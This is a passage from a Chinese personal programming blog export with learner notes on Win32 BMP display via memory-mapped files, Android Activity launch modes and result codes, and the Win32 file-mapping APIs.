<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CStudy_BMPDlg::OnDestroy()</span><br><span class="line">&#123;</span><br><span class="line">	CDialogEx::OnDestroy();</span><br><span class="line">	DeleteDC(m_hMemDC);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个点击完毕之后，我们可以加一个按钮或者说加一个菜单，这里我为了简单，我就加了一个按钮，但效果的话呢没有加菜单好一些。</p>
<p>按钮点击：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CStudy_BMPDlg::OnBnClickedButton1()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="function">CFileDialog <span class="title">file</span><span class="params">(TRUE)</span></span>;</span><br><span class="line">	<span class="keyword">if</span> (!file.DoModal())</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	HANDLE hFile = CreateFile(file.GetPathName(),GENERIC_READ,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(file.GetPathName()+<span class="string">":File Open Fail"</span>);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	HANDLE hMap = CreateFileMapping(hFile,<span class="literal">NULL</span>,PAGE_READONLY,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">	LPVOID lpBase = MapViewOfFile(hMap,FILE_MAP_READ,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	BITMAPFILEHEADER *pFileHeader = (BITMAPFILEHEADER *)lpBase;</span><br><span class="line">	<span class="keyword">if</span> (pFileHeader-&gt;bfType != MAKEWORD(<span class="string">'B'</span>,<span class="string">'M'</span>))<span class="comment">//MAKEWORD这个宏看名字就能看出来，就是把一个放在高位，一个放在低位形成一个WORD类型的数据，这句话就是判断是不是BMP文件</span></span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(<span class="string">"打开BMP文件啊老哥！"</span>);</span><br><span class="line">		UnmapViewOfFile(lpBase);</span><br><span class="line">		CloseHandle(hMap);</span><br><span class="line">		CloseHandle(hFile);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	BYTE *pBits = (BYTE*)lpBase+pFileHeader-&gt;bfOffBits;</span><br><span class="line">	BITMAPINFO *pInfoHeader = (BITMAPINFO *)((BYTE*)lpBase+<span class="keyword">sizeof</span>(BITMAPFILEHEADER));</span><br><span class="line">	m_nHeight = <span class="built_in">abs</span>(pInfoHeader-&gt;bmiHeader.biHeight);</span><br><span class="line">	m_nWidth = <span class="built_in">abs</span>(pInfoHeader-&gt;bmiHeader.biWidth);</span><br><span class="line">	<span class="function">CClientDC <span class="title">dc</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">	HBITMAP hBitmap = CreateCompatibleBitmap(dc,m_nWidth,m_nHeight);</span><br><span class="line">	<span class="keyword">if</span>(SelectObject(m_hMemDC,hBitmap) == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		UnmapViewOfFile(lpBase);</span><br><span class="line">		CloseHandle(hMap);</span><br><span class="line">		CloseHandle(hFile);</span><br><span class="line">		MessageBox(<span class="string">"选择对象失败"</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> nRet = SetDIBitsToDevice(m_hMemDC,<span class="number">0</span>,<span class="number">0</span>,m_nWidth,m_nHeight,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,m_nHeight,pBits,pInfoHeader,DIB_RGB_COLORS);</span><br><span class="line">	<span class="keyword">if</span> (!nRet)</span><br><span class="line">		MessageBox(<span class="string">"映射失败"</span>);</span><br><span class="line">	InvalidateRect(<span class="literal">NULL</span>,TRUE);</span><br><span class="line">	UnmapViewOfFile(lpBase);</span><br><span class="line">	CloseHandle(hMap);</span><br><span class="line">	CloseHandle(hFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们就需要说一下，首先我们先用通用对话框打开一个文件，但是不知道是我电脑还是什么情况，书上写的是<code>GetFileName</code>，但是这个的话呢只是获取文件的名字啊，不在一个目录下的话呢相对路径是找不到的，所以我就用了<code>GetPathName</code>这个函数，然后我们就用<code>CreateFile</code>打开一个文件，常规的打开属性就可以了，打开之后我们就开始我们的正题了，就是进行文件的内存映射操作，首先可定时创建一个文件内存映射，由于我们不需要进行内存的共享，所以最后一个参数可以设置为NULL，然后将映射的这块进行分配内存，分配完毕之后我们将这块内存给我们之前说的第一个BMP结构体，这个时候我们就需要用bfType判断一下是不是开头BM了，这个我在注释上详细说了，大家看注释就好了，然后如果不是BMP文件我们就关闭打开的东西，确定是BMP文件之后，我们给一个<code>BYTE</code>的指针，主要是用来保存我们的真是图片数据的，这个图片数据是基地址+相对偏移进行计算出来的，然后我们计算我们的文件信息的地址，这个地址比较有意思，就是说我们第一个结构体紧随其后的就是他，我们只需要用基地址加上第一个BMP结构体的大小就可以计算出来他的一个内存地址了，计算出来之后，在我们获取宽和高的时候问题就来了，在用QQ进行截图生成的BMP文件的时候我在测试过程中，一直出错，不知道原因，慢慢多测试了几次，往上回溯了几次，发现为什么我的高是个负数？我现在也没明白，所以不得不我加上了一个取绝对值的函数，这样就就算可以了，之后我们在创建一个兼容的位图，用来存储我们的图片数据，和我们的客户区DC相兼容，然后将获取到的BMP句柄选入DC，之后我们需要将数据进行拷贝，用到了<code>SetDIBitsToDevice</code>这个函数，就是将数据传输给我们的设备对象：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SetDIBitsToDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HDC hdc,              <span class="comment">// handle to device context</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> XDest,            <span class="comment">// x-coordinate of upper-left corner of </span></span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="comment">// dest. rect.</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> YDest,            <span class="comment">// y-coordinate of upper-left corner of </span></span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="comment">// dest. rect.</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwWidth,        <span class="comment">// source rectangle width</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwHeight,       <span class="comment">// source rectangle height</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> XSrc,             <span class="comment">// x-coordinate of lower-left corner of </span></span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="comment">// source rect.</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> YSrc,             <span class="comment">// y-coordinate of lower-left corner of </span></span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="comment">// source rect.</span></span></span></span><br><span class="line"><span class="function"><span class="params">  UINT uStartScan,      <span class="comment">// first scan line in array</span></span></span></span><br><span class="line"><span class="function"><span class="params">  UINT cScanLines,      <span class="comment">// number of scan lines</span></span></span></span><br><span class="line"><span class="function"><span class="params">  CONST VOID *lpvBits,  <span class="comment">// address of array with DIB bits</span></span></span></span><br><span class="line"><span class="function"><span class="params">  CONST BITMAPINFO *lpbmi,  <span class="comment">// address of structure with bitmap info.</span></span></span></span><br><span class="line"><span class="function"><span class="params">  UINT fuColorUse       <span class="comment">// RGB or palette indexes</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>很好理解，倒数第二个参数就是我们的BMP结构信息，最后一个参数：</p>
<table>
<thead>
<tr>
<th>Value</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>DIB_PAL_COLORS</td>
<td>The color table consists of an array of 16-bit indexes into the currently selected logical palette.</td>
</tr>
<tr>
<td>DIB_RGB_COLORS</td>
<td>The color table contains literal RGB values</td>
</tr>
</tbody></table>
<p>我们就选择RGB，之后我们就需要关闭各种东西啦，然后使客户区无效。<br>然后在OnPaint中编写：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CStudy_BMPDlg::OnPaint()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="function">CPaintDC <span class="title">dc</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">	BitBlt(dc,<span class="number">0</span>,<span class="number">0</span>,m_nWidth,m_nHeight,m_hMemDC,<span class="number">0</span>,<span class="number">0</span>,SRCCOPY);</span><br><span class="line">	<span class="keyword">if</span> (IsIconic())</span><br><span class="line">	&#123;</span><br><span class="line">		 <span class="comment">// 用于绘制的设备上下文</span></span><br><span class="line"></span><br><span class="line">		SendMessage(WM_ICONERASEBKGND, <span class="keyword">reinterpret_cast</span>&lt;WPARAM&gt;(dc.GetSafeHdc()), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 使图标在工作区矩形中居中</span></span><br><span class="line">		<span class="keyword">int</span> cxIcon = GetSystemMetrics(SM_CXICON);</span><br><span class="line">		<span class="keyword">int</span> cyIcon = GetSystemMetrics(SM_CYICON);</span><br><span class="line">		CRect rect;</span><br><span class="line">		GetClientRect(&amp;rect);</span><br><span class="line">		<span class="keyword">int</span> x = (rect.Width() - cxIcon + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">int</span> y = (rect.Height() - cyIcon + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 绘制图标</span></span><br><span class="line">		dc.DrawIcon(x, y, m_hIcon);		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		CDialogEx::OnPaint();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不要忘记一点就好了要写在外面，判断不一定进去的，这样我们就写好了我们的BMP浏览。<br><code>BitBlt</code>就是一个数据拷贝的函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">BitBlt</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HDC hdcDest, <span class="comment">// handle to destination device context</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> nXDest,  <span class="comment">// x-coordinate of destination rectangle's upper-left </span></span></span></span><br><span class="line"><span class="function"><span class="params">               <span class="comment">// corner</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> nYDest,  <span class="comment">// y-coordinate of destination rectangle's upper-left </span></span></span></span><br><span class="line"><span class="function"><span class="params">               <span class="comment">// corner</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> nWidth,  <span class="comment">// width of destination rectangle</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> nHeight, <span class="comment">// height of destination rectangle</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HDC hdcSrc,  <span class="comment">// handle to source device context</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> nXSrc,   <span class="comment">// x-coordinate of source rectangle's upper-left </span></span></span></span><br><span class="line"><span class="function"><span class="params">               <span class="comment">// corner</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> nYSrc,   <span class="comment">// y-coordinate of source rectangle's upper-left </span></span></span></span><br><span class="line"><span class="function"><span class="params">               <span class="comment">// corner</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwRop  <span class="comment">// raster operation code</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Activity启动模式</title>
    <url>/2020/01/30/Activity%E5%90%AF%E5%8A%A8%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="Activity启动模式"><a href="#Activity启动模式" class="headerlink" title="Activity启动模式"></a>Activity启动模式</h1><p>Activity启动模式分为四种，四种都是比较特别的（除了第一种，因为他就是默认的），下面一一的介绍一下。</p>
<h2 id="standard启动模式"><a href="#standard启动模式" class="headerlink" title="standard启动模式"></a>standard启动模式</h2><p>这个启动模式就是默认的，我们可以声明，也可以不声明，但在这个地方我还是声明一下来演示怎么声明，其实也很简单在我们的Activity节点中加一个属性，就是：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">android:launchMode="standard"</span><br></pre></td></tr></table></figure>
<p>其实就是一个launchMode的设置，这个模式的特点就是说在这个窗口栈中我们的窗口是一个一个叠加的在上面的完全遵守这个规则。</p>
<h2 id="singleTop启动模式"><a href="#singleTop启动模式" class="headerlink" title="singleTop启动模式"></a>singleTop启动模式</h2><p>这个模式有一点点的特殊，就是说如果singleTop的窗口当前为栈顶的话呢，我们在此打开这个singleTop窗口的话呢其实是不创建新的窗口的，就像是我们打开：A-&gt;B-&gt;B的打开方式，实际上是A-&gt;B（B是singleTop），最后一次其实没有打开，但是虽然没有调用onCreate方法，但是我们却调用了别的一个方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onNewIntent</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">	<span class="keyword">super</span>.onNewIntent(intent);</span><br><span class="line">	Log.d(<span class="string">"aaa"</span>, <span class="string">"666"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就是在我们singleTop在栈顶的时候我们再打开这个窗口我们就会调用这个方法，主要区分是不是重复调用的我感觉。</p>
<h2 id="singleTask启动模式"><a href="#singleTask启动模式" class="headerlink" title="singleTask启动模式"></a>singleTask启动模式</h2><p>这个模式也还是比较特殊的，理解起来也比较好理解，比如说我们的打开顺序是这个样子的：A-&gt;B-&gt;C-&gt;B，那么最终是：A-&gt;B（B是singleTask），其实就是说我们的singleTask如果在栈中存在了的话呢，我们再次加载他，那么原先在他之上的窗口都将被销毁，然后调用哪个<code>onNewIntent</code>方法，也还是比较好理解的。</p>
<h2 id="singleInstance启动模式"><a href="#singleInstance启动模式" class="headerlink" title="singleInstance启动模式"></a>singleInstance启动模式</h2><p>这个模式最特殊我感觉，就是说我们在这个程序的窗口栈中，那么我们打开这个模式的窗口，这个模式不会加入这个栈中，而是自己重新建一个栈，就他这一个实例。</p>
<h3 id="getTaskId"><a href="#getTaskId" class="headerlink" title="getTaskId"></a><code>getTaskId</code></h3><p>这个东西就是说用来获取当前窗口栈的编号。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Activity返回数据</title>
    <url>/2020/01/30/Activity%E8%BF%94%E5%9B%9E%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<h1 id="从Activity返回数据"><a href="#从Activity返回数据" class="headerlink" title="从Activity返回数据"></a>从Activity返回数据</h1><p>一开始我认为这个东西就和模态对话框差不多有返回值的，但再看一下由于安卓的限制，这个东西还是比那个强大一点的。<br>这个东西即使比较广泛，获取的数据分为两种，请求码（requestCode）与结果码（resultCode），这两个东西我一开是有点混，主要是不知道请求码的意义，现在明白了，但还是不是很管用，那么现在就分析一下。</p>
<h2 id="请求码"><a href="#请求码" class="headerlink" title="请求码"></a>请求码</h2><p>这个东西主要使用来告诉安卓，我们是点击的哪个按钮来打开一个新的窗口的，就比如说有两个按钮，我们打开同一个Activity，返回来的时候我们想知道到底是哪个点开的哪个界面，这个时候我们就要在打开的时候传递一个特定的请求码，例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">intent.setClass(MainActivity.<span class="keyword">this</span>, activity<span class="class">.<span class="keyword">class</span>)</span>;<span class="comment">//packageContext上下文</span></span><br><span class="line">startActivityForResult(intent, <span class="number">1</span>);<span class="comment">//requestCode是一个请求码</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">intent.setClass(MainActivity.<span class="keyword">this</span>, activity<span class="class">.<span class="keyword">class</span>)</span>;<span class="comment">//packageContext上下文</span></span><br><span class="line">startActivityForResult(intent, <span class="number">2</span>);<span class="comment">//requestCode是一个请求码</span></span><br></pre></td></tr></table></figure>
<p>我们用到了一个新的方法这个方法就是用来请求Activity的，并且我们要求又返回数据，当我们在新的Activity操作完毕之后，我们点击返回的时候我们就需要获取这个数据，我们需要重写<code>onActivityResult</code>方法，主要是用来获取数据的，具体写法看下面示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onActivityResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="keyword">int</span> resultCode, Intent data)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">super</span>.onActivityResult(requestCode, resultCode, data);</span><br><span class="line">	<span class="keyword">if</span> (data != <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="keyword">switch</span> (requestCode) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			Bundle bundle = data.getExtras();</span><br><span class="line">			Log.d(<span class="string">"Q1"</span>, bundle.getString(<span class="string">"Name"</span>));</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			Bundle bundle2 = data.getExtras();</span><br><span class="line">			Log.d(<span class="string">"Q2"</span>, bundle2.getString(<span class="string">"Name"</span>));</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/*switch (resultCode) &#123;</span></span><br><span class="line"><span class="comment">		case 1:</span></span><br><span class="line"><span class="comment">			Bundle bundle = data.getExtras();</span></span><br><span class="line"><span class="comment">			Log.d("R1", bundle.getString("Name"));</span></span><br><span class="line"><span class="comment">			break;</span></span><br><span class="line"><span class="comment">		case 2:</span></span><br><span class="line"><span class="comment">			Bundle bundle2 = data.getExtras();</span></span><br><span class="line"><span class="comment">			Log.d("R2", bundle2.getString("Name"));</span></span><br><span class="line"><span class="comment">			break;</span></span><br><span class="line"><span class="comment">		default:</span></span><br><span class="line"><span class="comment">			break;</span></span><br><span class="line"><span class="comment">		&#125;*/</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，我们在按钮点击事件的时候我们传入的请求码<strong>1和2</strong>我们这个响应中我们需要处理，然后做相关的操作。</p>
<h2 id="结果码"><a href="#结果码" class="headerlink" title="结果码"></a>结果码</h2><p>这个主要是操作完毕进行处理的，操作完毕相应的时候我们获取的，我们设置一个button是用来返回的（例如保存），这个时候我们就可以进行判断（有两个按钮，一个保存一个取消这个样子的我们需要进行处理），我们的<code>onActivityResult</code>方法这么写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onActivityResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="keyword">int</span> resultCode, Intent data)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">super</span>.onActivityResult(requestCode, resultCode, data);</span><br><span class="line">	<span class="keyword">if</span> (data != <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="comment">/*switch (requestCode) &#123;</span></span><br><span class="line"><span class="comment">		case 1:</span></span><br><span class="line"><span class="comment">			Bundle bundle = data.getExtras();</span></span><br><span class="line"><span class="comment">			Log.d("Q1", bundle.getString("Name"));</span></span><br><span class="line"><span class="comment">			break;</span></span><br><span class="line"><span class="comment">		case 2:</span></span><br><span class="line"><span class="comment">			Bundle bundle2 = data.getExtras();</span></span><br><span class="line"><span class="comment">			Log.d("Q2", bundle2.getString("Name"));</span></span><br><span class="line"><span class="comment">			break;</span></span><br><span class="line"><span class="comment">		default:</span></span><br><span class="line"><span class="comment">			break;</span></span><br><span class="line"><span class="comment">		&#125;*/</span></span><br><span class="line">		<span class="keyword">switch</span> (resultCode) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			Bundle bundle = data.getExtras();</span><br><span class="line">			Log.d(<span class="string">"R1"</span>, bundle.getString(<span class="string">"Name"</span>));</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			Bundle bundle2 = data.getExtras();</span><br><span class="line">			Log.d(<span class="string">"R2"</span>, bundle2.getString(<span class="string">"Name"</span>));</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这就是相应，那么我们在点击保存的时候怎么写呢？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">intent.putExtra(<span class="string">"Name"</span>, <span class="string">"Wker"</span>);</span><br><span class="line">setResult(<span class="number">1</span>,intent);</span><br><span class="line">finish();<span class="comment">//关闭当前的Activity，回到上一层</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">intent.putExtra(<span class="string">"Name"</span>, <span class="string">"Wker"</span>);</span><br><span class="line">setResult(<span class="number">2</span>,intent);</span><br><span class="line">finish();<span class="comment">//关闭当前的Activity，回到上一层</span></span><br></pre></td></tr></table></figure>
<p>这个Intent只是用来传输数据的！</p>
<p>这个时候我们就能够进行数据返回的一个操作了，但是在这里有一点一定要注意，可能注意到我判断了一下data是否为null，因为在我们没有点击保存或者取消的时候我们之间点的是返回，所以我们并没有传输数据，这个时候很明显的就是会报一个空指针的错误，我们需要判断是不是空指针才能进行打印。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>内存映射文件1</title>
    <url>/2020/01/29/%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84%E6%96%87%E4%BB%B61/</url>
    <content><![CDATA[<h1 id="内存映射"><a href="#内存映射" class="headerlink" title="内存映射"></a>内存映射</h1><p>这个可以是一个很厉害的技术，之前学过很多次相关的只是，但是都是有一些遗忘，这一次重新认真的学习一下。<br>与虚拟内存相比，内存映射提交到物理存储器的是来自于磁盘上的相应文件而不是系统页面文件，一旦被映射了就相当于整个文件被映射了过来，虚拟内存的页面文件我记得也就是页面大小的几倍（叫做什么粒度我也忘记了）</p>
<h2 id="内存映射的目的"><a href="#内存映射的目的" class="headerlink" title="内存映射的目的"></a>内存映射的目的</h2><ol>
<li>内存映射加载EXE和DLL，极大地缩短了启动的时间。</li>
<li>访问磁盘上的数据，避免了执行I/O操作，也避免了文件的内容申请缓冲区</li>
<li>内存之间的数据传输，像什么管道啊，油槽啊之类的各种东西好像都是基于内存映射的。</li>
</ol>
<ul>
<li>CreateFileMapping  </li>
<li>FlushViewOfFile  </li>
<li>MapViewOfFile  </li>
<li>MapViewOfFileEx  </li>
<li>MapViewOfFileVlm  </li>
<li>OpenFileMapping  </li>
<li>UnmapViewOfFile   </li>
<li>UnmapViewOfFileVlm  </li>
</ul>
<p>基本上就这么几个，我还是准备分几篇博客写这个东西</p>
<h2 id="创建一个内存映射内核对象CreateFileMapping"><a href="#创建一个内存映射内核对象CreateFileMapping" class="headerlink" title="创建一个内存映射内核对象CreateFileMapping"></a>创建一个内存映射内核对象<code>CreateFileMapping</code></h2><p><code>CreateFileMapping</code>创建一个内核对象，函数的原型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateFileMapping</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hFile,              <span class="comment">// handle to file to map</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpFileMappingAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="comment">// optional security attributes</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD flProtect,           <span class="comment">// protection for mapping object</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwMaximumSizeHigh,   <span class="comment">// high-order 32 bits of object size</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwMaximumSizeLow,    <span class="comment">// low-order 32 bits of object size</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpName             <span class="comment">// name of file-mapping object</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<ol>
<li>hFile如果是传给他一个<code>CreateFile</code>的HANDLE对象的话呢，那将是打开这个文件，如果是-1的话呢，那将创建一个内存映射。</li>
<li>第三个参数是内存映射文件的保护属性，主要是下面这三值：<code>PAGE_READONLY</code> <code>PAGE_READWRITE</code> <code>PAGE_WRITECOPY</code>看名字就知道了。</li>
<li>三四个参数的话呢是大小，一半给他0，就是和文件一样大。</li>
<li>最后一个是内存映射文件的名字</li>
</ol>
<h2 id="打开内存映射文件OpenFileMapping"><a href="#打开内存映射文件OpenFileMapping" class="headerlink" title="打开内存映射文件OpenFileMapping"></a>打开内存映射文件<code>OpenFileMapping</code></h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenFileMapping</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwDesiredAccess,  <span class="comment">// access mode</span></span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL bInheritHandle,    <span class="comment">// inherit flag</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpName          <span class="comment">// pointer to name of file-mapping object</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>第一个参数<code>dwDesiredAccess</code>就和那个打开文件感觉很像。</p>
<ul>
<li>FILE_MAP_WRITE Read-write access. The target file-mapping object must have been created with PAGE_READWRITE protection. A read-write view of the file is mapped. </li>
<li>FILE_MAP_READ Read-only access. The target file-mapping object must have been created with PAGE_READWRITE or PAGE_READ protection. A read-only view of the file is mapped. </li>
<li>FILE_MAP_ALL_ACCESS Same as FILE_MAP_WRITE. </li>
<li>FILE_MAP_COPY Copy-on-write access. The target file-mapping object must have been created with PAGE_WRITECOPY protection. A copy-on-write view of the file is mapped. </li>
</ul>
</li>
<li><p>第二个参数和之前那个一样就是询问一下可不可以继承</p>
</li>
<li><p>就是创建内核对象时候的名称</p>
</li>
</ol>
<p>返回文件打开的一个句柄，失败返回NULL</p>
<h2 id="分配内存地址MapViewOfFile"><a href="#分配内存地址MapViewOfFile" class="headerlink" title="分配内存地址MapViewOfFile"></a>分配内存地址<code>MapViewOfFile</code></h2><p>下一步就是为内存映射文件线性内存地址（其实就是给他一块内存），函数原型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">MapViewOfFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hFileMappingObject,  <span class="comment">// file-mapping object to map into </span></span></span></span><br><span class="line"><span class="function"><span class="params">                              <span class="comment">// address space</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwDesiredAccess,      <span class="comment">// access mode</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFileOffsetHigh,     <span class="comment">// high-order 32 bits of file offset</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFileOffsetLow,      <span class="comment">// low-order 32 bits of file offset</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwNumberOfBytesToMap  <span class="comment">// number of bytes to map</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<ol>
<li>第二个参数就是一个权限类型<ul>
<li>FILE_MAP_READ</li>
<li>FILE_MAP_WRITE</li>
<li>FILE_MAP_ALL_ACCESS</li>
<li>FILE_MAP_COPY</li>
</ul>
</li>
<li>第三四个参数就是起始位置</li>
<li>最后一个参数给0就是映射整个文件大小</li>
</ol>
<p>函数返回成功的话呢给的是我们一个内存地址，失败返回NULL</p>
<h2 id="撤销映射UnmapViewOfFile"><a href="#撤销映射UnmapViewOfFile" class="headerlink" title="撤销映射UnmapViewOfFile"></a>撤销映射<code>UnmapViewOfFile</code></h2><p>函数原型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">UnmapViewOfFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCVOID lpBaseAddress   <span class="comment">// address where mapped view begins</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>很简单就是内存地址<br>然后我们调用<code>CloseHandle</code>关闭句柄</p>
